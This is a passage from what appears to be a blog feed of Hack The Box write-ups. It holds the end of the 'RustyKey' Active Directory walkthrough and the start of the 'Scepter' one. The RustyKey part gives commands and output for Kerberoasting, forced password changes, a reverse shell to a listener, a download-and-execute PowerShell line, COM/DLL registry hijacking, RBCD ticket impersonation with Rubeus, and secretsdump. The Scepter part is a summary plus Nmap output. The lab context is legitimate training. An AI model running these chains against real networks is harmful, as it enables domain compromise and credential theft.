2025-07-01 02:16:40 0LDAP        10.10.11.75     389    DC               dd.ali                        2025-07-01 02:16:40 0LDAP        10.10.11.75     389    DC               ee.reed                       2025-07-01 02:16:40 0LDAP        10.10.11.75     389    DC               nn.marcos                     2024-12-27 05:34:50 0LDAP        10.10.11.75     389    DC               backupadmin                   2024-12-29 18:30:18 11LDAP        10.10.11.75     389    DC               [*] Total records returned: 16LDAP        10.10.11.75     389    DC               DC$LDAP        10.10.11.75     389    DC               Support-Computer1$LDAP        10.10.11.75     389    DC               Support-Computer2$LDAP        10.10.11.75     389    DC               Support-Computer3$LDAP        10.10.11.75     389    DC               Support-Computer4$LDAP        10.10.11.75     389    DC               Support-Computer5$LDAP        10.10.11.75     389    DC               Finance-Computer1$LDAP        10.10.11.75     389    DC               Finance-Computer2$LDAP        10.10.11.75     389    DC               Finance-Computer3$LDAP        10.10.11.75     389    DC               Finance-Computer4$LDAP        10.10.11.75     389    DC               Finance-Computer5$LDAP        10.10.11.75     389    DC               IT-Computer1$LDAP        10.10.11.75     389    DC               IT-Computer2$LDAP        10.10.11.75     389    DC               IT-Computer3$LDAP        10.10.11.75     389    DC               IT-Computer4$LDAP        10.10.11.75     389    DC               IT-Computer5$

Lets make a list and try all these users and computers.
konoha# impacket-GetUserSPNs -dc-ip 10.10.11.75 &#x27;rustykey.htb/rr.parker&#x27; -usersfile user.lst -k -no-passImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)$krb5tgs$23$*krbtgt$RUSTYKEY.HTB$krbtgt*$172f44f5c03cb0964a08add4f0727799$&lt;SNIP&gt;[-] Principal: rr.parker - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)[-] Principal: mm.turner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)[-] Principal: bb.morgan - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)[-] Principal: gg.anderson - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)[-] Principal: dd.ali - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)[-] Principal: ee.reed - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)[-] Principal: nn.marcos - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)[-] Principal: backupadmin - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)$krb5tgs$23$*DC$$RUSTYKEY.HTB$DC$*$7664306543510d4896b1e31f823a0256$&lt;SNIP&gt;&lt;SNIP&gt;

This returns many hashes that we can try to crack offline. When we do we get one that cracks.
konoha# hashcat HASHES --showHash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:13100 | Kerberos 5, etype 23, TGS-REP | Network ProtocolNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.$krb5tgs$23$*IT-Computer3$$RUSTYKEY.HTB$IT-Computer3$*$1424a46c534b22e4a188835b00461505$8ebe6eacca6940cec84b7fd9a6&lt;SNIP&gt;:&lt;SNIP&gt;


We now have new credentials to IT-Computer3$. We can look back at Bloodhound and see what permissions we have and looking as we have some interesting ones, we can start there. 

From this we have the following:

AddSelf
HelpDesk


ForceChangePassword
bb.morgan
ee.reed
gg.anderson
GenericWrite
dd.ali






AddMember
Protected Objects



So we can add ourselves to HelpDesk group and then we can remove the IT and Support groups from the Protected Objects group. This will let us change the passwords for these users and requests TGTs for them. I created a little script that lets me do all this at once.
Error states the entry already exists, as the comptuer already has been added to the HelpDesk group already
konoha# ./runRCE.shRetriving TGTImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] Saving ticket in IT-Computer3$.ccacheExporting TicketAdding Computer to Helpdesk[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75[*] Trying to connect to DC.rustykey.htb...[+] Connection successfulTraceback (most recent call last):  File &quot;/root/.local/bin/bloodyAD&quot;, line 8, in &lt;module&gt;    sys.exit(main())             ~~~~^^  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py&quot;, line 210, in main    output = args.func(conn, **params)  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py&quot;, line 252, in groupMember    conn.ldap.bloodymodify(group, &#123;&quot;member&quot;: [(Change.ADD.value, member_transformed)]&#125;)    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  File &quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py&quot;, line 301, in bloodymodify    raise errmsldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=HelpDesk,CN=Users,DC=rustykey,DC=htb! Result code: &quot;entryAlreadyExists&quot; Reason: &quot;b&#x27;00000562: UpdErr: DSID-031A11DA, problem 6005 (ENTRY_EXISTS), data 0\n\x00&#x27;&quot;Removing Support and IT from Protected Objects[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75[*] Trying to connect to DC.rustykey.htb...[+] Connection successful[-] CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75[*] Trying to connect to DC.rustykey.htb...[+] Connection successful[-] CN=SUPPORT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTBSetting Password:P@ssw0rd123! for ee.reed,bb.morgan,gg.anderson. Grab a TGT afterwards.[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75[*] Trying to connect to DC.rustykey.htb...[+] Connection successful[+] Password changed successfully![+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75[*] Trying to connect to DC.rustykey.htb...[+] Connection successful[+] Password changed successfully![+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75[*] Trying to connect to DC.rustykey.htb...[+] Connection successful[+] Password changed successfully!

Now we can request a TGT and try to get on the box seeing how most of the users are in the Remote Management group. Yet, if we look at the attributes set for gg.anderson, their account is disabled and we have no way of removing that User Account Control.  
uSNCreated: 20637userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORDuserPrincipalName: gg.anderson@rustykey.htb
So for ee.reed and dd.ali, even getting a TGT wonâ€™t allow us to log in. The only ticket to work was bb.morgan.
Foothold with bb.morganOnce we have the correct krb5.conf we can get on the box. You can use nxc to generate a krb file as well with this TGT.
konoha# nxc smb DC.rustykey.htb -d rustykey.htb -k --use-kcache --generate-krb5-file rustykey.confSMB         DC.rustykey.htb 445    DC               [*]  x64 (name:DC) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)SMB         DC.rustykey.htb 445    DC               [+] rustykey.htb\bb.morgan from ccachekonoha# cat rustykey.conf[libdefaults]    dns_lookup_kdc = false    dns_lookup_realm = false    default_realm = RUSTYKEY.HTB[realms]    RUSTYKEY.HTB = &#123;        kdc = dc.rustykey.htb        admin_server = dc.rustykey.htb        default_domain = rustykey.htb    &#125;[domain_realm]    .rustykey.htb = RUSTYKEY.HTB    rustykey.htb = RUSTYKEY.HTB
Once do we can WinRM onto the box. 
Initially, our enumeration doesnâ€™t find anything other then a 7-Zip directory in Program Files, weâ€™ll come back to that and move on to the users we have the ability to change the password of. Looking at all the users we have, ee.reed is in the Support group. We can laterally move to him and see what kind of permissions he has. 
*Evil-WinRM* PS C:\programdata&gt; .\RCs.exe ee.reed P@ssw0rd123! &quot;C:\ProgramData\a.exe&quot; -t 0[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.[*] Warning: The logon for user &#x27;ee.reed&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.[+] Running in session 0 with process function CreateProcessWithLogonW()[+] Using Station\Desktop: Service-0x0-6658a90$\Default[+] Async process &#x27;C:\ProgramData\a.exe&#x27; with pid 13996 created in background.*Evil-WinRM* PS C:\programdata&gt;-----konoha# rlwrap -cAr nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.7] from (UNKNOWN) [10.10.11.75] 52766Microsoft Windows [Version 10.0.17763.7434](c) 2018 Microsoft Corporation. All rights reserved.C:\Windows\system32&gt;whoamiwhoamirustykey\ee.reed

Shell as ee.reedStarting with enumeration again,this time using PrivescCheck.ps1 we find a COM Registry.
PS C:\Windows\system32&gt; iwr http://10.10.14.7:81/PrivescCheck.ps1 -UseBasicParsing | iexiwr http://10.10.14.7:81/PrivescCheck.ps1 -UseBasicParsing | iexPS C:\Windows\system32&gt; Invoke-PrivescCheck&lt;SNIP&gt;????????????????????????????????????????????????????????????????? CATEGORY ? TA0004 - Privilege Escalation                     ?? NAME     ? COM server registry permissions                   ?? TYPE     ? Base                                              ?????????????????????????????????????????????????????????????????? Check whether the current user has any modification rights   ?? on a COM server in the registry. This may not necessarily    ?? result in a privilege escalation. Further analysis is        ?? required.                                                    ?????????????????????????????????????????????????????????????????&lt;SNIP&gt;Id                : 23170f69-40c1-278a-1000-000100020000Name              : 7-Zip Shell ExtensionRegPath           : HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;HandlerType       : InprocServer32FTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\InprocServer32HandlerDataType   : FilePathHandlerData       : C:\Program Files\7-Zip\7-zip.dllModifiablePath    : HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\InprocServer32IdentityReference : RUSTYKEY\Support (S-1-5-21-3316070415-896458127-4139322052-1132)Permissions       : AllAccess


Funny enough this was seen when we had a session as bb.morgan. We have AllAccess so we can use some classic DLL hijacking and replace this value within registry. After creating a simple dll using msfvenom we can upload it, setup a listener and edit the value.. 
PS C:\Windows\system32&gt; reg add &quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\InprocServer32&quot; /ve /t REG_SZ /d &quot;C:\ProgramData\a.dll&quot;reg add &quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\InprocServer32&quot; /ve /t REG_SZ /d &quot;C:\ProgramData\a.dll&quot;Value  exists, overwrite(Yes/No)? YesThe operation completed successfully.PS C:\Windows\system32&gt; reg query &quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\&quot; /ve /sreg query &quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\&quot; /ve /sHKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;    (Default)    REG_SZ    7-Zip Shell ExtensionHKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\InprocServer32    (Default)    REG_SZ    C:\ProgramData\a.dll

Waiting a minute or two results in getting a shell as mm.turner.
konoha# rlwrap -cAr nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.7] from (UNKNOWN) [10.10.11.75] 52428Microsoft Windows [Version 10.0.17763.7434](c) 2018 Microsoft Corporation. All rights reserved.C:\Windows&gt;whoamiwhoamirustykey\mm.turner

Shell as mm.turnerInteresting, we now have a shell as mm.turner, and if we look back at Bloodhound we see heâ€™s apart of DelegationManagers. That being said, we have AddAllowedToAct to the DC$. So essentially here we have RBCD(Resource-Based Constrained Delegation). This article helps explain the theory, yet what we need to do is set the attribute PrincipalsAllowedToDelegateToAccount on the DC$ to allow for the computer account we control (IT-Computer3$), and then impersonate and high level user. Using S4U2Self+S4U2proxy weâ€™re able to get a TGS and then use that to authenticate to the DC$. As mm.turner, we can set the attribute for the DC$, then for the rbcd we will be using Rubeus.exe.
Mom said Iâ€™m allowed too Privesc!!
Letâ€™s go ahead a get the TGS as backupadmin and then we can secretsdump.
PS C:\ProgramData&gt; $targetComputer = &quot;CN=DC,OU=DOMAIN CONTROLLERS,DC=RUSTYKEY,DC=HTB&quot;$targetComputer = &quot;CN=DC,OU=DOMAIN CONTROLLERS,DC=RUSTYKEY,DC=HTB&quot;PS C:\ProgramData&gt; Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount &quot;CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb&quot;Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount &quot;CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb&quot;PS C:\ProgramData&gt; .\Rub.exe hash /domain:rustykey.htb /user:IT-Computer3$ /password:&lt;SNIP&gt;.\Rub.exe hash /domain:rustykey.htb /user:IT-Computer3$ /password:&lt;SNIP&gt;   ______        _  (_____ \      | |   _____) )_   _| |__  _____ _   _  ___  |  __  /| | | |  _ \| ___ | | | |/___)  | |  \ \| |_| | |_) ) ____| |_| |___ |  |_|   |_|____/|____/|_____)____/(___/  v2.2.0[*] Action: Calculate Password Hash(es)[*] Input password             : &lt;SNIP&gt;[*] Input username             : IT-Computer3$[*] Input domain               : rustykey.htb[*] Salt                       : RUSTYKEY.HTBhostit-computer3.rustykey.htb[*]       rc4_hmac             : &lt;SNIP&gt;[*]       aes128_cts_hmac_sha1 : &lt;SNIP&gt;[*]       aes256_cts_hmac_sha1 : &lt;SNIP&gt;[*]       des_cbc_md5          : &lt;SNIP&gt;PS C:\ProgramData&gt;./Rub.exe s4u /nowrap /impersonateuser:backupadmin /domain:rustykey.htb /user:IT-Computer3$ /password:&lt;SNIP&gt; /rc4:&lt;SNIP&gt;  /msdsspn:host/dc.rustykey.htb /ptt   ______        _  (_____ \      | |   _____) )_   _| |__  _____ _   _  ___  |  __  /| | | |  _ \| ___ | | | |/___)  | |  \ \| |_| | |_) ) ____| |_| |___ |  |_|   |_|____/|____/|_____)____/(___/  v2.2.0[*] Action: S4U[*] Using rc4_hmac hash: &lt;SNIP&gt;[*] Building AS-REQ (w/ preauth) for: &#x27;rustykey.htb\IT-Computer3$&#x27;[*] Using domain controller: fe80::bd5e:24aa:d271:1fea%11:88[+] TGT request successful![*] base64(ticket.kirbi):      doIFmDCCBZSgAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoQ4bDFJVU1RZS0VZLkhUQqIhMB                                        &lt;SNIP&gt;[*] Action: S4U[*] Building S4U2self request for: &#x27;IT-Computer3$@RUSTYKEY.HTB&#x27;[*] Using domain controller: dc.rustykey.htb (fe80::bd5e:24aa:d271:1fea%11)[*] Sending S4U2self request to fe80::bd5e:24aa:d271:1fea%11:88[+] S4U2self success![*] Got a TGS for &#x27;backupadmin&#x27; to &#x27;IT-Computer3$@RUSTYKEY.HTB&#x27;[*] base64(ticket.kirbi):      doIFtjCCBbKgAwIBBaEDAgEWooIEzzCCBMthggTHMIIEw6ADAgEFoQ4bDFJVU1RZS0VZLkhUQqIaMB                                        &lt;SNIP&gt;[*] Impersonating user &#x27;backupadmin&#x27; to target SPN &#x27;host/dc.rustykey.htb&#x27;[*] Building S4U2proxy request for service: &#x27;host/dc.rustykey.htb&#x27;[*] Using domain controller: dc.rustykey.htb (fe80::bd5e:24aa:d271:1fea%11)[*] Sending S4U2proxy request to domain controller fe80::bd5e:24aa:d271:1fea%11:88[+] S4U2proxy success![*] base64(ticket.kirbi) for SPN &#x27;host/dc.rustykey.htb&#x27;:      doIGfjCCBnqgAwIBBaEDAgEWooIFjzCCBYthggWHMIIFg6ADAgEFoQ4bDFJVU1RZS0VZLkhUQqIiML                                        &lt;SNIP&gt;[+] Ticket successfully imported!
For myself, I like to use /ptt which does pass-the-ticket but allows me to know that Rubeus succeeded. Then I can look at the ticket on the host system to make sure everything is correct.
This gets us a TGS for the user backupadmin, from here we can import and secretsdump. (using a script for my b64 TGS)
konoha# source ./converITAll.sh doIGfjCCBnqgAwIBBaEDAgEWooIFjzCCBYthggWHMIIFg6ADAgEFoQ4bDFJ&lt;SNIP&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] converting kirbi to ccache...[+] doneTicket cache: FILE:./Admin.ccacheDefault principal: backupadmin@RUSTYKEY.HTBValid starting       Expires              Service principal07/01/2025 19:55:02  07/02/2025 05:55:02  host/dc.rustykey.htb@RUSTYKEY.HTB	renew until 07/08/2025 19:55:02konoha# impacket-secretsdump @dc.rustykey.htb -k -no-pass -dc-ip 10.10.11.75Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] Service RemoteRegistry is in stopped state[*] Starting service RemoteRegistry[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>kerberoasting SPNs</tag>
        <tag>Registry</tag>
        <tag>DACL Abuse</tag>
        <tag>COM HiJack</tag>
        <tag>RBCD</tag>
      </tags>
  </entry>
  <entry>
    <title>Scepter (Windows Hard)</title>
    <url>/2025/05/23/Scepter/</url>
    <content><![CDATA[
Initial Nmap found a NFS containing pfx keys and a key file and a cert file. By use pfx2john and creating a hash we crack the password. Then creating a pfx file using the cracked password with openssl. Then we auth and recieve d.baker hash. After getting a bloodhound dump we see d.baker has ForceChangePassword over a.carter. After doing so, we see a.carter has GenericAll over the Staff Access Certificate. Using dacledit.py we give a.carter access. Then we set a mail attribute for d.baker to h.brown@scepter.htb using bloodyAD. Then request again using upn h.brown. From there we can auth and recieve h.brownâ€˜s hash as well as ccache we can export and use. We have write over p.adams account and if we look at h.brown attributes we see altSecurityIdentities. This is weak encryption and we can set this attribute to p.adams and then set d.baker mail attribute to p.adams. Once done we request again using upn p.adams. This get us the hash for p.adams, from here we are a Replication Operator and we can just secretsdump to obtain the Administrator hash.
Initial NmapPORT     STATE SERVICE       REASON          VERSION53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-21 02:54:59Z)111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)| rpcinfo:|   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/tcp6  rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  2,3,4        111/udp6  rpcbind|   100003  2,3         2049/udp   nfs|   100003  2,3         2049/udp6  nfs|   100003  2,3,4       2049/tcp   nfs|   100003  2,3,4       2049/tcp6  nfs|   100005  1,2,3       2049/tcp   mountd|   100005  1,2,3       2049/tcp6  mountd|   100005  1,2,3       2049/udp   mountd|   100005  1,2,3       2049/udp6  mountd|   100021  1,2,3,4     2049/tcp   nlockmgr|   100021  1,2,3,4     2049/tcp6  nlockmgr|   100021  1,2,3,4     2049/udp   nlockmgr|   100021  1,2,3,4     2049/udp6  nlockmgr|   100024  1           2049/tcp   status|   100024  1           2049/tcp6  status|   100024  1           2049/udp   status|_  100024  1           2049/udp6  status135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.scepter.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-01T03:22:33| Not valid after:  2025-11-01T03:22:33| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9| -----BEGIN CERTIFICATE-----| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS|_-----END CERTIFICATE-----|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.445/tcp  open  microsoft-ds? syn-ack ttl 127464/tcp  open  kpasswd5?     syn-ack ttl 127593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.scepter.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-01T03:22:33| Not valid after:  2025-11-01T03:22:33| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9| -----BEGIN CERTIFICATE-----| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp| 